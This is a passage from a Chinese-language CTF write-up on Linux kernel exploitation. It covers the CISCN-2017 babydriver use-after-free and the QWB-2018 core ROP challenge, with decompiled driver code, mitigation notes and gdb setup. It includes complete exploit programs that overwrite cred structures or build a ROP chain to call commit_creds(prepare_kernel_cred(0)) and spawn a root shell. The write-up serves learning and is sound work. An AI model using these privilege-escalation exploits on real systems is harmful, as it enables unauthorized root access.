for the subj creds too */    /* dumpability changes */    if (!uid_eq(old-&gt;euid, new-&gt;euid) ||        !gid_eq(old-&gt;egid, new-&gt;egid) ||        !uid_eq(old-&gt;fsuid, new-&gt;fsuid) ||        !gid_eq(old-&gt;fsgid, new-&gt;fsgid) ||        !cred_cap_issubset(old, new)) {        if (task-&gt;mm)            set_dumpable(task-&gt;mm, suid_dumpable);        task-&gt;pdeath_signal = 0;        smp_wmb();    }    /* alter the thread keyring */    if (!uid_eq(new-&gt;fsuid, old-&gt;fsuid))        key_fsuid_changed(task);    if (!gid_eq(new-&gt;fsgid, old-&gt;fsgid))        key_fsgid_changed(task);    /* do it     * RLIMIT_NPROC limits on user-&gt;processes have already been checked     * in set_user().     */    alter_cred_subscribers(new, 2);    if (new-&gt;user != old-&gt;user)        atomic_inc(&amp;new-&gt;user-&gt;processes);    rcu_assign_pointer(task-&gt;real_cred, new);    rcu_assign_pointer(task-&gt;cred, new);    if (new-&gt;user != old-&gt;user)        atomic_dec(&amp;old-&gt;user-&gt;processes);    alter_cred_subscribers(old, -2);    /* send notifications */    if (!uid_eq(new-&gt;uid,   old-&gt;uid)  ||        !uid_eq(new-&gt;euid,  old-&gt;euid) ||        !uid_eq(new-&gt;suid,  old-&gt;suid) ||        !uid_eq(new-&gt;fsuid, old-&gt;fsuid))        proc_id_connector(task, PROC_EVENT_UID);    if (!gid_eq(new-&gt;gid,   old-&gt;gid)  ||        !gid_eq(new-&gt;egid,  old-&gt;egid) ||        !gid_eq(new-&gt;sgid,  old-&gt;sgid) ||        !gid_eq(new-&gt;fsgid, old-&gt;fsgid))        proc_id_connector(task, PROC_EVENT_GID);    /* release the old obj and subj refs both */    put_cred(old);    put_cred(old);    return 0;}/** * prepare_kernel_cred - Prepare a set of credentials for a kernel service * @daemon: A userspace daemon to be used as a reference * * Prepare a set of credentials for a kernel service.  This can then be used to * override a task&#39;s own credentials so that work can be done on behalf of that * task that requires a different subjective context. * * @daemon is used to provide a base for the security record, but can be NULL. * If @daemon is supplied, then the security data will be derived from that; * otherwise they&#39;ll be set to 0 and no groups, full capabilities and no keys. * * The caller may change these controls afterwards if desired. * * Returns the new credentials or NULL if out of memory. * * Does not take, and does not return holding current-&gt;cred_replace_mutex. */struct cred *prepare_kernel_cred(struct task_struct *daemon){    const struct cred *old;    struct cred *new;    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);    if (!new)        return NULL;    kdebug(&quot;prepare_kernel_cred() alloc %p&quot;, new);    if (daemon)        old = get_task_cred(daemon);    else        old = get_cred(&amp;init_cred);    validate_creds(old);    *new = *old;    atomic_set(&amp;new-&gt;usage, 1);    set_cred_subscribers(new, 0);    get_uid(new-&gt;user);    get_user_ns(new-&gt;user_ns);    get_group_info(new-&gt;group_info);#ifdef CONFIG_KEYS    new-&gt;session_keyring = NULL;    new-&gt;process_keyring = NULL;    new-&gt;thread_keyring = NULL;    new-&gt;request_key_auth = NULL;    new-&gt;jit_keyring = KEY_REQKEY_DEFL_THREAD_KEYRING;#endif#ifdef CONFIG_SECURITY    new-&gt;security = NULL;#endif    if (security_prepare_creds(new, old, GFP_KERNEL) &lt; 0)        goto error;    put_cred(old);    validate_creds(new);    return new;error:    put_cred(new);    put_cred(old);    return NULL;}</code></pre><p>执行 <code>commit_creds(prepare_kernel_cred(0));</code> 即可获得 root 权限。两个函数的地址都可以在 <code>/proc/kallsyms</code> 文件中查看：</p><pre><code class="bash">$ sudo cat /proc/kallsyms | grep -E &quot;commit_creds|prepare_kernel_cred&quot;ffffffff810a24a0 T commit_credsffffffff810a2890 T prepare_kernel_credffffffff81d7f6c0 R __ksymtab_commit_credsffffffff81d881d0 R __ksymtab_prepare_kernel_credffffffff81d9f028 r __kcrctab_commit_credsffffffff81da35b0 r __kcrctab_prepare_kernel_credffffffff81db01e7 r __kstrtab_prepare_kernel_credffffffff81db022e r __kstrtab_commit_creds</code></pre><h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><ul><li>CANARY、DEP、PIE、RELRO 等保护与用户态原理和作用相同；</li><li>smep（Supervisor Mode Execution Protection）：当处理器处于 Ring 0 模式时，执行用户空间的代码会触发页错误；</li><li>smap（Superivisor Mode Access Protection）：类似于 smep，通常是在访问数据时；</li><li>mmap_min_addr：控制着 mmap 能够映射的最低内存地址。</li></ul><h1 id="Kernel-UAF（CISCN-2017-babydriver）"><a href="#Kernel-UAF（CISCN-2017-babydriver）" class="headerlink" title="Kernel UAF（CISCN-2017-babydriver）"></a>Kernel UAF（CISCN-2017-babydriver）</h1><p>题目中给了三个文件，<code>boot.sh</code>、<code>bzImage</code> 和 <code>rootfs.cpio</code>。<code>bzImage</code> 即为被压缩的内核可执行文件；<code>boot.sh</code> 为 QEMU 的启动脚本：</p><pre><code class="bash">$ tar -xvf babydriver.tarx boot.shx bzImagex rootfs.cpio$ file bzImagebzImage: Linux kernel x86 boot executable bzImage, version 4.4.72 (atum@ubuntu) #1 SMP Thu Jun 15 19:52:50 PDT 2017, RO-rootFS, swap_dev 0x6, Normal VGA$ bat boot.sh───────┬────────────────────────────────────────────────────────────────────────       │ File: boot.sh───────┼────────────────────────────────────────────────────────────────────────   1   │ #!/bin/bash   2   │   3   │ qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#39;console       │ =ttyS0 root=/dev/ram oops=panic panic=1&#39; -enable-kvm -monitor /dev/null       │  -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep───────┴────────────────────────────────────────────────────────────────────────</code></pre><p>接下来主要看文件系统 <code>rootfs.cpio</code>。用 <code>gunzip</code> 对其进行解压缩，可以看到用的是 4.4.72 的内核，然后可以看到根目录下有一个 init 启动脚本，用来设置 flag 的相关权限和安装 babydriver 模块。也就是说只有变成 root 才能查看 flag：</p><pre><code class="bash">$ file rootfs.cpiorootfs.cpio: gzip compressed data, last modified: Tue Jul  4 08:39:15 2017, max compression, from Unix$ mv rootfs.cpio rootfs.cpio.gz$ gunzip ./rootfs.cpio.gz$ file rootfs.cpiorootfs.cpio: ASCII cpio archive (SVR4 with no CRC)$ mkdir fs &amp;&amp; cd fs$ cpio -idmv &lt; ../rootfs.cpio.etcetc/init.detc/passwdetc/groupbin...initprocliblib/moduleslib/modules/4.4.72lib/modules/4.4.72/babydriver.kosysusr...tmplinuxrchomehome/ctf5556 blocks$ bat init───────┬────────────────────────────────────────────────────────────────────────       │ File: init───────┼────────────────────────────────────────────────────────────────────────   1   │ #!/bin/sh   2   │   3   │ mount -t proc none /proc   4   │ mount -t sysfs none /sys   5   │ mount -t devtmpfs devtmpfs /dev   6   │ chown root:root flag   7   │ chmod 400 flag   8   │ exec 0&lt;/dev/console   9   │ exec 1&gt;/dev/console  10   │ exec 2&gt;/dev/console  11   │  12   │ insmod /lib/modules/4.4.72/babydriver.ko  13   │ chmod 777 /dev/babydev  14   │ echo -e &quot;\nBoot took $(cut -d&#39; &#39; -f1 /proc/uptime) seconds\n&quot;  15   │ setsid cttyhack setuidgid 1000 sh  16   │  17   │ umount /proc  18   │ umount /sys  19   │ poweroff -d 0  -f  20   │───────┴────────────────────────────────────────────────────────────────────────</code></pre><p>接下来看 <code>babydriver.ko</code> 的相关保护，和 ELF 是类似的这里只开了 NX：</p><pre><code class="bash">$ file babydriver.kobabydriver.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=8ec63f63d3d3b4214950edacf9e65ad76e0e00e7, not stripped$ checksec ./babydriver.ko    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x0)</code></pre><p>接下来进 IDA 看看有哪些函数。先了解一个<a href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cdev.h#L12" target="_blank" rel="noopener">结构体 <code>cdev</code></a>（每个字符设备都对应一个 <code>cdev</code> 结构的变量）：</p><pre><code class="cpp">struct cdev {    struct kobject kobj; // 每个cdev都是一个kobject    struct module *owner; // owner指向实现驱动的模块    const struct file_operations *ops; // 操纵这个字符设备的方法    struct list_head list; // 与cdev对应的字符设备文件的inode链表头    dev_t dev; // 起始设备编号    unsigned int count; // 设备范围号大小};</code></pre><p>首先是模块的入口函数 <code>babydriver_init</code>，主要是一系列对 <code>/dev/babydev</code> 设备的注册：</p><pre><code class="cpp">int __cdecl babydriver_init(){  int v0; // edx  __int64 v1; // rsi  int v2; // ebx  class *v3; // rax  __int64 v4; // rax  if ( (signed int)alloc_chrdev_region(&amp;babydev_no, 0LL, 1LL, &quot;babydev&quot;) &gt;= 0 ) // 动态分配设备编号  {    cdev_init(&amp;cdev_0, &amp;fops); // 静态初始化cdev    v1 = babydev_no;    cdev_0.owner = &amp;_this_module; // 设置owner为指定模块    v2 = cdev_add(&amp;cdev_0, babydev_no, 1LL); // 将cdev添加到系统中    if ( v2 &gt;= 0 )    {      v3 = (class *)_class_create(&amp;_this_module, &quot;babydev&quot;, &amp;babydev_no); // 将babydev注册到内核中      babydev_class = v3;      if ( v3 )      {        v4 = device_create(v3, 0LL, babydev_no, 0LL, &quot;babydev&quot;); // 创建设备节点        v0 = 0;        if ( v4 ) // 创建成功          return v0;        printk(&amp;unk_351, 0LL); // 创建设备节点失败        class_destroy(babydev_class); // 取消注册      }      else // 注册失败      {        printk(&amp;unk_33B, &quot;babydev&quot;);      }      cdev_del(&amp;cdev_0); // 从系统中删除cdev    }    else // 分配失败    {      printk(&amp;unk_327, v1);    }    unregister_chrdev_region(babydev_no, 1LL); // 释放设备号    return v2;  }  printk(&amp;unk_309, 0LL);  return 1;}</code></pre><p>然后在模块退出函数中对设备等进行删除和释放资源：</p><pre><code class="cpp">void __cdecl babydriver_exit(){  device_destroy(babydev_class, babydev_no);  class_destroy(babydev_class);  cdev_del(&amp;cdev_0);  unregister_chrdev_region(babydev_no, 1LL);}</code></pre><p>在 <code>babyioctl</code> 中可以看到模块中有一个结构体 <code>babydev_struct</code>。首先调用 <code>kfree</code> 释放对应的 <code>device_buf</code>，然后调用 <code>kmalloc</code> 指定大小的内存，并设置 <code>device_buf_len</code>：</p><pre><code class="cpp">// local variable allocation has failed, the output may be wrong!__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg){  size_t v3; // rdx  size_t len; // rbx  __int64 result; // rax  _fentry__(filp, *(_QWORD *)&amp;command, arg);  len = v3;  if ( command == 0x10001 )  {    kfree(babydev_struct.device_buf);    babydev_struct.device_buf = (char *)_kmalloc(len, 0x24000C0LL);    babydev_struct.device_buf_len = len;    printk(&quot;alloc done\n&quot;, 0x24000C0LL);    result = 0LL;  }  else  {    printk(&amp;unk_2EB, v3);    result = -22LL;  }  return result;}</code></pre><p>在 <code>babyopen</code> 中打开：</p><pre><code class="cpp">int __fastcall babyopen(inode *inode, file *filp){  _fentry__(inode, filp);  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 0x40LL);  babydev_struct.device_buf_len = 0x40LL;  printk(&quot;device open\n&quot;, 0x24000C0LL);  return 0;}</code></pre><p><code>babyread</code> 中调用 <code>copy_to_user</code> 从 <code>babydev_struct.device_buf</code> 读取指定的字符串到用户空间：</p><pre><code class="cpp">ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset){  size_t v4; // rdx  ssize_t result; // rax  ssize_t v6; // rbx  _fentry__(filp, buffer);  if ( !babydev_struct.device_buf )    return -1LL;  result = -2LL;  if ( babydev_struct.device_buf_len &lt;= v4 )    return result;  v6 = v4;  copy_to_user(buffer);  result = v6;  return result;}</code></pre><p><code>babywrite</code> 调用 <code>copy_from_user</code> 读一段数据到 <code>babydev_struct.device_buf</code> 上：</p><pre><code class="cpp">ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset){  size_t v4; // rdx  ssize_t result; // rax  ssize_t v6; // rbx  _fentry__(filp, buffer);  if ( !babydev_struct.device_buf )    return -1LL;  result = -2LL;  if ( babydev_struct.device_buf_len &lt;= v4 )    return result;  v6 = v4;  copy_from_user();  result = v6;  return result;}</code></pre><p>最后 <code>babyrelease</code> 函数将 <code>device_buf</code> 对应的内存释放：</p><pre><code class="cpp">int __fastcall babyrelease(inode *inode, file *filp){  _fentry__(inode, filp);  kfree(babydev_struct.device_buf);  printk(&quot;device release\n&quot;, filp);  return 0;}</code></pre><p>这里的漏洞在于 <code>babyopen</code> 处没有检查打开了几个设备，存在 Use After Free，具体利用方法如下：</p><ol><li>打开两次 <code>/dev/babydev</code>，第二次的分配会覆盖到第一次分配的内存，然后释放第一次分配的内存；</li><li>创建一个新进程，新进程中的 <code>cred</code> 结构体和之前释放的重叠，也就是修改第二次的 <code>babydev</code> 就能改到新进程的 <code>cred</code> 结构体；</li><li>创建时将第二次的 <code>babydev</code> 改成对应 <code>cred</code> 结构体的大小（如下），然后把对应偏移处的 <code>gid</code> 和 <code>uid</code> 改为 0，就实现了提权到 root。</li></ol><pre><code class="cpp">struct cred {    atomic_t    usage;#ifdef CONFIG_DEBUG_CREDENTIALS    atomic_t    subscribers;    /* number of processes subscribed */    void        *put_addr;    unsigned    magic;#define CRED_MAGIC    0x43736564#define CRED_MAGIC_DEAD    0x44656144#endif    kuid_t        uid;        /* real UID of the task */    kgid_t        gid;        /* real GID of the task */    kuid_t        suid;        /* saved UID of the task */    kgid_t        sgid;        /* saved GID of the task */    kuid_t        euid;        /* effective UID of the task */    kgid_t        egid;        /* effective GID of the task */    kuid_t        fsuid;        /* UID for VFS ops */    kgid_t        fsgid;        /* GID for VFS ops */    unsigned    securebits;    /* SUID-less security management */    kernel_cap_t    cap_inheritable; /* caps our children can inherit */    kernel_cap_t    cap_permitted;    /* caps we&#39;re permitted */    kernel_cap_t    cap_effective;    /* caps we can actually use */    kernel_cap_t    cap_bset;    /* capability bounding set */    kernel_cap_t    cap_ambient;    /* Ambient capability set */#ifdef CONFIG_KEYS    unsigned char    jit_keyring;    /* default keyring to attach requested                     * keys to */    struct key __rcu *session_keyring; /* keyring inherited over fork */    struct key    *process_keyring; /* keyring private to this process */    struct key    *thread_keyring; /* keyring private to this thread */    struct key    *request_key_auth; /* assumed request_key authority */#endif#ifdef CONFIG_SECURITY    void        *security;    /* subjective LSM security */#endif    struct user_struct *user;    /* real user ID subscription */    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */    struct group_info *group_info;    /* supplementary groups for euid/fsgid */    struct rcu_head    rcu;        /* RCU deletion hook */};</code></pre><p>Exploit：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stropts.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/stat.h&gt;int main() {    int fd1, fd2, pid;    fd1 = open(&quot;/dev/babydev&quot;, 2);    fd2 = open(&quot;/dev/babydev&quot;, 2);    ioctl(fd1, 0x10001, 0xa8); // 修改babydev_struct.device_buf_len的长度为cred结构体的长度    close(fd1); // 释放第一次的内存    pid = fork(); // 创建进程    if (pid &lt; 0) {        puts(&quot;[!] fork error...&quot;);        exit(-1);    } else if (pid == 0) { // 子进程        uint8_t fake_cred[30];        memset(fake_cred, 0, sizeof(fake_cred));        write(fd2, fake_cred, 28);        if (getuid() == 0) {            puts(&quot;[+] get root!&quot;);            system(&quot;/bin/sh&quot;);            exit(0);        }    } else {        wait(NULL);    }    close(fd2);    return 0;}</code></pre><p>因为文件系统中没有 Library，需要静态编译才能正常执行。然后打包新的文件系统后运行 <code>boot.sh</code>：</p><pre><code class="bash">$ makecc -static    exp.c   -o exp$ file ./exp./exp: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=8af26f6763d0d44db98089ae847f6104a4054c93, not stripped$ cd fs/ &amp;&amp; find . | cpio -o --format=newc &gt; ../rootfs.cpio7349 blocks$ cd .. &amp;&amp; sudo ./boot.sh</code></pre><p>使用 lsmod 可以查看加载模块的基地址：</p><pre><code class="bash">/ $ lsmodbabydriver 16384 0 - Live 0xffffffffc0000000 (OE)/ $ iduid=1000(ctf) gid=1000(ctf) groups=1000(ctf)/ $ cat flagcat: can&#39;t open &#39;flag&#39;: Permission denied/ $ /tmp/exp[   23.769095] device open[   23.773231] device open[   23.775415] alloc done[   23.784434] device release[+] get root!/ # iduid=0(root) gid=0(root) groups=1000(ctf)/ # cat flagflag{this_is_a_flag}/ #</code></pre><blockquote><p><a href="http://p4nda.top/2018/10/11/ciscn-2017-babydriver/" target="_blank" rel="noopener">P4nda</a> 以及 <a href="https://www.anquanke.com/post/id/86490" target="_blank" rel="noopener">Anceity</a> 两位大佬都提供了 ROP 的做法。</p></blockquote><h1 id="Kernel-ROP（QWB-2018-core）"><a href="#Kernel-ROP（QWB-2018-core）" class="headerlink" title="Kernel ROP（QWB-2018-core）"></a>Kernel ROP（QWB-2018-core）</h1><p>题目给了四个文件，vmlinux 即为 bzImage 未解压缩的版本（可以用 <a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux" target="_blank" rel="noopener"><code>extract-vmlinux</code></a> 来对 <code>bzImage</code> 解压缩）。<code>start.sh</code> 是一个启动脚本，其中可以看到开了 <code>kalsr</code>：</p><pre><code class="bash">$ tar -zxvf core_give.tar.gz./give_to_player/./give_to_player/bzImage./give_to_player/vmlinux./give_to_player/core.cpio./give_to_player/start.sh$ bat start.sh───────┬────────────────────────────────────────────────────────────────────────       │ File: start.sh───────┼────────────────────────────────────────────────────────────────────────   1   │ qemu-system-x86_64 \   2   │ -m 64M \   3   │ -kernel ./bzImage \   4   │ -initrd  ./core.cpio \   5   │ -append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;       │  \   6   │ -s  \   7   │ -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \   8   │ -nographic  \</code></pre><p>然后跟前面一样看一下看看文件系统里有啥，<code>init</code> 同样可以得到很多信息，：</p><ul><li>第 9 行把 <code>/proc/kallsyms</code> 的内容保存到了 <code>/tmp/kallsyms</code>，那么就可以从 <code>/tmp/kallsyms</code> 中读取到 <code>commit_creds</code> 和 <code>prepare_kernel_cred</code> 的地址；</li><li>第 10 行把 <code>kptr_restrict</code> 设为 1，禁止通过 <code>/proc/kallsyms</code> 查看函数地址，不过前面已经把其中的信息保存到了一个可读的文件中；</li><li>第 11 行把 <code>dmesg_restrict</code> 设为 1，禁止使用 dmesg；</li><li>第 18 行设置了定时关机，为了避免做题时产生干扰，可以直接把这句删掉然后重新打包。</li></ul><pre><code class="bash">$ file core.cpiocore.cpio: gzip compressed data, last modified: Fri Oct  5 14:08:36 2018, max compression, from Unix$ mv core.cpio core.cpio.gz$ gunzip ./core.cpio.gz$ lscore.cpio$ file ./core.cpio./core.cpio: ASCII cpio archive (SVR4 with no CRC)$ cpio -idmv &lt; ./core.cpio.usrusr/sbin...initetcetc/groupetc/passwdlib64lib64/ld-linux-x86-64.so.2lib64/libc.so.6lib64/libm.so.6...gen_cpio.shbin...vmlinuxrootlinuxrcliblib/modules...tmpcore.cpiocore.ko129851 blocks$ bat init───────┬────────────────────────────────────────────────────────────────────────       │ File: init───────┼────────────────────────────────────────────────────────────────────────   1   │ #!/bin/sh   2   │ mount -t proc proc /proc   3   │ mount -t sysfs sysfs /sys   4   │ mount -t devtmpfs none /dev   5   │ /sbin/mdev -s   6   │ mkdir -p /dev/pts   7   │ mount -vt devpts -o gid=4,mode=620 none /dev/pts   8   │ chmod 666 /dev/ptmx   9   │ cat /proc/kallsyms &gt; /tmp/kallsyms  10   │ echo 1 &gt; /proc/sys/kernel/kptr_restrict  11   │ echo 1 &gt; /proc/sys/kernel/dmesg_restrict  12   │ ifconfig eth0 up  13   │ udhcpc -i eth0  14   │ ifconfig eth0 10.0.2.15 netmask 255.255.255.0  15   │ route add default gw 10.0.2.2  16   │ insmod /core.ko  17   │  18   │ poweroff -d 120 -f &amp;  19   │ setsid /bin/cttyhack setuidgid 1000 /bin/sh  20   │ echo &#39;sh end!\n&#39;  21   │ umount /proc  22   │ umount /sys  23   │  24   │ poweroff -d 0  -f───────┴────────────────────────────────────────────────────────────────────────</code></pre><blockquote><ul><li>可以使用 <code>gen_cpio.sh</code> 重新打包；</li><li>如果不能正常启动，将 QEMU 的内存参数改为 128M。</li></ul></blockquote><p>接下来对模块文件进行分析。可以开导开了 Canary 和 NX：</p><pre><code class="bash">$ file ./core.ko./core.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=54943668385c6573ec1b40a7c06127d9423103b3, not stripped$ checksec ./core.ko    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x0)</code></pre><p>模块入口函数中注册了 <code>/proc/core</code>：</p><pre><code class="cpp">__int64 init_module(){  core_proc = proc_create(&quot;core&quot;, 438LL, 0LL, &amp;core_fops);  printk(&amp;unk_2DE);  return 0LL;}</code></pre><p>在退出函数中删除 <code>/proc/core</code>：</p><pre><code class="cpp">__int64 exit_core(){  __int64 result; // rax  if ( core_proc )    result = remove_proc_entry(&quot;core&quot;);  return result;}</code></pre><p>在 <code>core_ioctl</code> 中有一条 Switch 语句，分别对应 <code>core_read</code>、设置全局变量 <code>off</code> 的值以及 <code>core_copy_func</code>：</p><pre><code class="cpp">__int64 __fastcall core_ioctl(__int64 a1, int c, __int64 data_1){  __int64 data; // rbx  data = data_1;  switch ( c )  {    case 0x6677889B:      core_read(data_1);      break;    case 0x6677889C:      printk(&amp;unk_2CD);      off = data;      break;    case 0x6677889A:      printk(&amp;unk_2B3);      core_copy_func(data);      break;  }  return 0LL;}</code></pre><p><code>core_read</code> 从 <code>v5+off</code> 的位置复制 0x40 个字节到用户空间，也就是可以进行任意读：</p><pre><code class="cpp">unsigned __int64 __fastcall core_read(__int64 a1){  __int64 v1; // rbx  char *v2; // rdi  signed __int64 i; // rcx  unsigned __int64 result; // rax  char v5; // [rsp+0h] [rbp-50h]  unsigned __int64 v6; // [rsp+40h] [rbp-10h]  v1 = a1;  v6 = __readgsqword(0x28u);  printk(&amp;unk_25B);  printk(&amp;unk_275);  v2 = &amp;v5;  for ( i = 0x10LL; i; --i )  {    *(_DWORD *)v2 = 0; // memset(v2, 0, sizeof(v2))    v2 += 4;  }  strcpy(&amp;v5, &quot;Welcome to the QWB CTF challenge.\n&quot;);  result = copy_to_user(v1, &amp;v5 + off, 0x40LL);  if ( !result )    return __readgsqword(0x28u) ^ v6;  __asm { swapgs }  return result;}</code></pre><p><code>core_copy_func</code> 则是从全局变量 <code>name</code> 中复制指定长度的内容到局部变量 <code>buf</code> 上。且传入的长度是有符号整型 <code>signed __int64</code>，而 <code>qmemcpy</code> 的长度使用的是无符号整型 <code>unsigned __int16</code>，可以通过溢出来绕过前面的检查：</p><pre><code class="cpp">signed __int64 __fastcall core_copy_func(signed __int64 len){  signed __int64 result; // rax  __int64 buf; // [rsp+0h] [rbp-50h]  unsigned __int64 v3; // [rsp+40h] [rbp-10h]  v3 = __readgsqword(0x28u);  printk(&amp;unk_215);  if ( len &gt; 0x3F )  {    printk(&amp;unk_2A1);    result = 0xFFFFFFFFLL;  }  else  {    result = 0LL;    qmemcpy(&amp;buf, &amp;name, (unsigned __int16)len);  }  return result;}</code></pre><p><code>core_write</code> 往全局变量 <code>name</code> 上写指定内容：</p><pre><code class="cpp">signed __int64 __fastcall core_write(__int64 a1, __int64 buf, unsigned __int64 a3){  unsigned __int64 len; // rbx  len = a3;  printk(&amp;unk_215);  if ( len &lt;= 0x800 &amp;&amp; !copy_from_user(&amp;name, buf, len) )    return (unsigned int)len;  printk(&amp;unk_230);  return 0xFFFFFFF2LL;}</code></pre><p>最后 <code>core_release</code> 只是有一个 printk 输出：</p><pre><code class="cpp">__int64 core_release(){  printk(&amp;unk_204);  return 0LL;}</code></pre><p>综上整理一下不难发现，我们可以任意地址读、可以往一个全局变量和一个函数中的局部变量写，那么就有下面的 ROP 思路：</p><ol><li>使用 <code>ioctl</code> 设置全局变量 <code>off</code>，然后调用 <code>core_read</code> 来泄漏 Canary；</li><li>使用 <code>core_write</code> 向 <code>name</code> 写入 ROP 链（构造 <code>commit_creds(prepare_kernel_cred(0))</code>，地址通过 <code>/tmp/kallsyms</code> 中的内容获取）；</li><li>使用 <code>core_copy_func</code> 把 <code>name</code> 上构造的 ROP 链写到局部变量上；</li><li>最后返回用户态调用 <code>system(&quot;/bin/sh&quot;)</code>（通过 <code>swapgs ; iretq</code> 两条指令来恢复寄存器和返回用户态）。</li></ol><blockquote><p>关于找 Gadget 的方法，M4x 师傅说是用 ropper，但我个人感觉 ROPgadget 更快。</p><pre><code class="bash">$ ROPgadget --binary ./vmlinux &gt; gadgets</code></pre><p><code>ireq</code> 可以用 objdump 来找。</p></blockquote><p>TODO</p><p>Exploit：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/ioctl.h&gt;void spawn_shell() {  if (!getuid()) {        system(&quot;/bin/sh&quot;);        exit(0);    } else {        puts(&quot;[!] UID != 0&quot;);        exit(-1);    }}size_t commit_creds, prepare_kernel_cred;size_t raw_vmlinux_base = 0xffffffff81000000;size_t vmlinux_base = 0;size_t find_symbols() {    FILE *kallsyms_fd = fopen(&quot;/tmp/kallsyms&quot;, &quot;r&quot;);    if (kallsyms_fd &lt; 0) {        puts(&quot;[!] Open /tmp/kallsyms error...&quot;);        exit(-1);    }    char buf[0x30];    while(fgets(buf, 0x30, kallsyms_fd)) {        if (commit_creds &amp; prepare_kernel_cred)            return 0;        if (strstr(buf, &quot;commit_creds&quot;) &amp;&amp; !commit_creds) {            char hex[20];            strncpy(hex, buf, 16);            sscanf(hex, &quot;%llx&quot;, &amp;commit_creds);            printf(&quot;commit_creds =&gt; %p.\n&quot;, commit_creds);            vmlinux_base = commit_creds - 0x9c8e0;            printf(&quot;vmlinux_base =&gt; %p.\n&quot;, vmlinux_base);        }        if (strstr(buf, &quot;prepare_kernel_cred&quot;) &amp;&amp; !prepare_kernel_cred) {            char hex[20];            strncpy(hex, buf, 16);            sscanf(hex, &quot;%llx&quot;, &amp;prepare_kernel_cred);            printf(&quot;prepare_kernel_cred =&gt; %p.\n&quot;, prepare_kernel_cred);            vmlinux_base = prepare_kernel_cred - 0x9cce0;            printf(&quot;vmlinux_base =&gt; %p.\n&quot;, vmlinux_base);        }    }    if (!(prepare_kernel_cred &amp; commit_creds)) {        puts(&quot;[*] Error...&quot;);        exit(-1);    }}size_t user_cs, user_ss, user_rflags, user_sp;void save_status() {    __asm__(        &quot;mov user_cs, cs;\n&quot;        &quot;mov user_ss, ss;\n&quot;        &quot;mov user_sp, sp;\n&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;\n&quot;    );    puts(&quot;[*] User status has been saved.&quot;);}void set_off(int fd, long long idx) {    printf(&quot;[*] Set off = %ld.\n&quot;, idx);    ioctl(fd, 0x6677889C, idx);}void core_read(int fd, char *buf) {    puts(&quot;[*] Read to buf!&quot;);    ioctl(fd, 0x6677889B, buf);}void core_copy_func(int fd, long long size) {    printf(&quot;[*] Copy %ld byte(s) from user.\n&quot;, size);    ioctl(fd, 0x6677889A, size);}uint64_t pop_rdi_ret = 0xffffffff81000b2f;uint64_t pop_rdx_ret = 0xffffffff810a0f49;uint64_t pop_rcx_ret = 0xffffffff81021e53;uint64_t mov_rdi_rax_call_rdx = 0xffffffff8101aa6a;uint64_t swapgs_popfq_ret = 0xffffffff81a012da;uint64_t iretq_ret = 0xffffffff81050ac2;int main() {    save_status();    int fd = open(&quot;/proc/core&quot;, 2);    if(fd &lt; 0) {        puts(&quot;[*] Open /proc/core error...&quot;);        exit(-1);    }    find_symbols();    // gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;    ssize_t offset = vmlinux_base - raw_vmlinux_base;    set_off(fd, 0x40);    char buf[0x40];    core_read(fd, buf);    size_t canary = ((size_t *)buf)[0];    printf(&quot;[+] Canary = %p\n&quot;, canary);    size_t rop[0x1000] = {0};    int i;    for (i = 0; i &lt; 10; i++)        rop[i] = canary;    // prepare_kernel_cred(0)    rop[i++] = pop_rdi_ret + offset;    rop[i++] = 0;    rop[i++] = prepare_kernel_cred;    // ...    rop[i++] = pop_rdx_ret + offset; // pop rdx ; ret    rop[i++] = pop_rcx_ret + offset; // pop rcx ; ret    rop[i++] = mov_rdi_rax_call_rdx + offset; // mov rdi, rax ; call rdx    rop[i++] = commit_creds;    // Restore registers    rop[i++] = swapgs_popfq_ret + offset;    rop[i++] = 0;    rop[i++] = iretq_ret + offset;    rop[i++] = (size_t)spawn_shell; // rip    rop[i++] = user_cs;    rop[i++] = user_rflags;    rop[i++] = user_sp;    rop[i++] = user_ss;    write(fd, rop, 0x800); // Write rop chain    core_copy_func(fd, 0xffffffffffff0000 | (0x100));    return 0;}</code></pre><h1 id="Debug-with-gdb"><a href="#Debug-with-gdb" class="headerlink" title="Debug with gdb"></a>Debug with gdb</h1><p>进行调试的话一般要先在 QEMU 启动脚本中添加 <code>-gdb tcp::1234</code> 参数（<code>-s</code> 参数同理）。然后用 <code>gdb ./vmlinux</code> 启动 GDB（如果没有 <code>vmlinux</code> 需要提前提取）。接下来在 gdb 中添加调试符号：</p><pre><code class="gdb">add-symbol-file /path/to/lkms/example.ko [offset]</code></pre><blockquote><p><code>offset</code> 的值通过在 QEMU 中运行 lsmod 来得到：</p><pre><code class="bash">/ $ lsmodcore 16384 